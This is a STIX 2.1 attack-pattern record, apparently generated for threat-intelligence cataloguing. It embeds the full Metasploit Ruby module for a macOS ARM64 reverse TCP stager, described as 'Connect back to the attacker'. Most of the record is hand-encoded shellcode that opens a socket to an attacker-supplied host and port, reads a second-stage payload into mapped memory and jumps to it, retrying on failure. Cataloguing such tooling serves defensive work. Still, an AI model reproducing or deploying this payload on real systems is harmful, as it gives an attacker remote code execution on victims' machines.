{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d7226570-44cf-4ec7-ac42-2f3a3b0af077",
    "created": "2024-08-14T16:33:19.476036Z",
    "modified": "2024-08-14T16:33:19.47604Z",
    "name": "Reverse TCP Stager",
    "description": "Connect back to the attacker",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stagers/osx/aarch64/reverse_tcp.rb",
            "external_id": "reverse_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n###\n#\n# ReverseTcp\n# ----------\n#\n# Osx reverse TCP stager.\n#\n###\nmodule MetasploitModule\n  CachedSize = 328\n\n  include Msf::Payload::Stager\n\n  def initialize(info = {})\n    super(\n      merge_info(\n        info,\n        'Name' => 'Reverse TCP Stager',\n        'Description' => 'Connect back to the attacker',\n        'Author' => 'usiegl00',\n        'License' => MSF_LICENSE,\n        'Platform' => 'osx',\n        'Arch' => ARCH_AARCH64,\n        'Handler' => Msf::Handler::ReverseTcp,\n        'Stager' => { 'RequiresMidstager' => false },\n        'Convention' => 'sockedi'\n      )\n    )\n  end\n\n  def generate(_opts = {})\n    encoded_port = [datastore['LPORT'].to_i, 2].pack('vv').unpack('N').first\n    encoded_host = Rex::Socket.addr_aton(datastore['LHOST'] || '127.127.127.127').unpack('V').first\n    retry_count = datastore['StagerRetryCount']\n    seconds = datastore['StagerRetryWait']\n    sleep_seconds = seconds.to_i\n    sleep_nanoseconds = (seconds % 1 * 1000000000).to_i\n\n    payload = [\n      # Generated from external/source/shellcode/osx/aarch64/stager_sock_reverse.s\n      # <_main>:\n      0xaa1f03e0, # mov\tx0, xzr\n      0xd2802901, # mov\tx1, #328\n      0xd2800042, # mov\tx2, #2\n      0xd2820043, # mov\tx3, #4098\n      0xaa3f03e4, # mvn\tx4, xzr\n      0xaa1f03e5, # mov\tx5, xzr\n      0x580007d0, # ldr\tx16, 0x100003f80 <sleep_seconds+0x8>\n      0xd4000001, # svc\t#0\n      0xb100041f, # cmn\tx0, #1\n      0x54000600, # b.eq\t0x100003f54 <failed>\n      0xaa0003ec, # mov\tx12, x0\n      0xd280000a, # mov\tx10, #0\n      0x1000064b, # adr\tx11, #200\n      0xf940016b, # ldr\tx11, [x11]\n      # <socket>:\n      0xd2800040, # mov\tx0, #2\n      0xd2800021, # mov\tx1, #1\n      0xd2800002, # mov\tx2, #0\n      0x580006b0, # ldr\tx16, 0x100003f88 <sleep_seconds+0x10>\n      0xd4000001, # svc\t#0\n      0xaa0003ed, # mov\tx13, x0\n      0x10000501, # adr\tx1, #160\n      0xf9400021, # ldr\tx1, [x1]\n      0xf81f8fe1, # str\tx1, [sp, #-8]!\n      0x910003e1, # mov\tx1, sp\n      0xd2800202, # mov\tx2, #16\n      0x580005f0, # ldr\tx16, 0x100003f90 <sleep_seconds+0x18>\n      0xd4000001, # svc\t#0\n      0xaa0d03e0, # mov\tx0, x13\n      0xaa0c03e1, # mov\tx1, x12\n      0xd2802902, # mov\tx2, #328\n      0xd2800803, # mov\tx3, #64\n      0xaa1f03e4, # mov\tx4, xzr\n      0xaa1f03e5, # mov\tx5, xzr\n      0x58000530, # ldr\tx16, 0x100003f98 <sleep_seconds+0x20>\n      0xd4000001, # svc\t#0\n      0xaa0c03e0, # mov\tx0, x12\n      0xd2802901, # mov\tx1, #328\n      0xd28000a2, # mov\tx2, #5\n      0x580004d0, # ldr\tx16, 0x100003fa0 <sleep_seconds+0x28>\n      0xd4000001, # svc\t#0\n      0xd61f0180, # br\tx12\n      # <retry>:\n      0xd100056b, # sub\tx11, x11, #1\n      0xf100017f, # cmp\tx11, #0\n      0x540001c0, # b.eq\t0x100003f54 <failed>\n      0xd2800000, # mov\tx0, #0\n      0xd2800001, # mov\tx1, #0\n      0x10000242, # adr\tx2, #72\n      0xf9400042, # ldr\tx2, [x2]\n      0x10000243, # adr\tx3, #72\n      0xf9400063, # ldr\tx3, [x3]\n      0xa9bf0be3, # stp\tx3, x2, [sp, #-16]!\n      0x910003e4, # mov\tx4, sp\n      0xd2800002, # mov\tx2, #0\n      0xd2800003, # mov\tx3, #0\n      0x58000310, # ldr\tx16, 0x100003fa8 <sleep_seconds+0x30>\n      0xd4000001, # svc\t#0\n      0x54ffface, # b.al\t0x100003ea8 <socket>\n      # <failed>:\n      0xd2800020, # mov\tx0, #1\n      0x580002d0, # ldr\tx16, 0x100003fb0 <sleep_seconds+0x38>\n      0xd4000001, # svc\t#0\n      # <caddr>:\n      encoded_port, # ldr\td2, 0x100025f60 <SYS_MMAP+0xfe025e9b>\n      encoded_host, # <unknown>\n      # <retry_count>:\n      retry_count, # udf\t#16962\n      0x00000000, # udf\t#16962\n      # <sleep_nanoseconds>:\n      0x00000000, # udf\t#17219\n      sleep_nanoseconds, # udf\t#17219\n      # <sleep_seconds>:\n      0x00000000, # udf\t#17476\n      sleep_seconds, # udf\t#17476\n      0x020000c5, # <unknown>\n      0x00000000, # udf\t#0\n      0x02000061, # <unknown>\n      0x00000000, # udf\t#0\n      0x02000062, # <unknown>\n      0x00000000, # udf\t#0\n      0x0200001d, # <unknown>\n      0x00000000, # udf\t#0\n      0x0200004a, # <unknown>\n      0x00000000, # udf\t#0\n      0x0200005d, # <unknown>\n      0x00000000, # udf\t#0\n      0x02000001, # <unknown>\n      0x00000000, # udf\t#0\n    ].pack('V*')\n    return payload\n  end\nend\n",
    "x_mitre_platforms": [
        "osx'"
    ]
}